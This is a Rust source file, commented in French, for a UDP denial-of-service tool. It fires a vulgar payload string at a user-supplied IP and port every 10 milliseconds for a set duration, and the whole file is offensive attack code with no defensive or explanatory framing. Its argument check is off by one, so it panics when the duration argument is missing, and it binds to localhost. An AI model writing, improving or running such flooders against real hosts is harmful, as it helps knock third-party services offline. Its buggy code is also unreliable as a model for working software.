use tokio;
use std::error::Error;
use std::net::UdpSocket;
use std::env;
use tokio::sync::mpsc;
use tokio::time::{sleep, Duration};



async fn send_udp_message(server_addr: &str) -> Result<(), Box<dyn Error>> {
    // Crée un socket UDP asynchrone
    let socket = UdpSocket::bind("127.0.0.1:0")?;

    // Message à envoyer
    let msg = b"8==========>";

    // Envoie le message au serveur de manière asynchrone
    socket.send_to(msg, server_addr)?;
    println!("Message envoyé à {}", server_addr);

    Ok(())
}





async fn chrono(tx: mpsc::Sender<()>, ddos_time:u64) {

    sleep(Duration::from_secs(ddos_time)).await;
    println!("chrono over");

    // ESignal de fin
    let _ = tx.send(()).await;
}

async fn ddos_udp(rx: &mut mpsc::Receiver<()>, target_clone: String) {

    let mut cmp = 0;

    loop {
        tokio::select! {
            _ = sleep(Duration::from_millis(10)) => {
                println!("cmp = {}", cmp);
                send_udp_message(&target_clone).await.expect("Erreur lors de l'envoi du message UDP");
                cmp += 1;
                println!("Message périodique");
            }
            _ = rx.recv() => {
                // Arrêter d'afficher des messages lorsque le signal est reçu
                println!("Arret fin du temps");
                break;
            }
        }
    }
}


#[tokio::main]
async fn main() {

    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        eprintln!("Usage: {} <ip> <port>", args[0]);
        return;
    }

    let target = format!("{}:{}", args[1], args[2]);
    let ddos_time:u64 = args[3].parse::<u64>().unwrap();

    let (tx, mut rx) = mpsc::channel(1);

    // Création des futures pour les deux tâches asynchrones
    let chrono_task = tokio::spawn(async move {
        chrono(tx,ddos_time).await;
    });

    let print_task = tokio::spawn(async move {
        ddos_udp(&mut rx, target).await;
    });



    chrono_task.await.unwrap();
    print_task.await.unwrap();
}


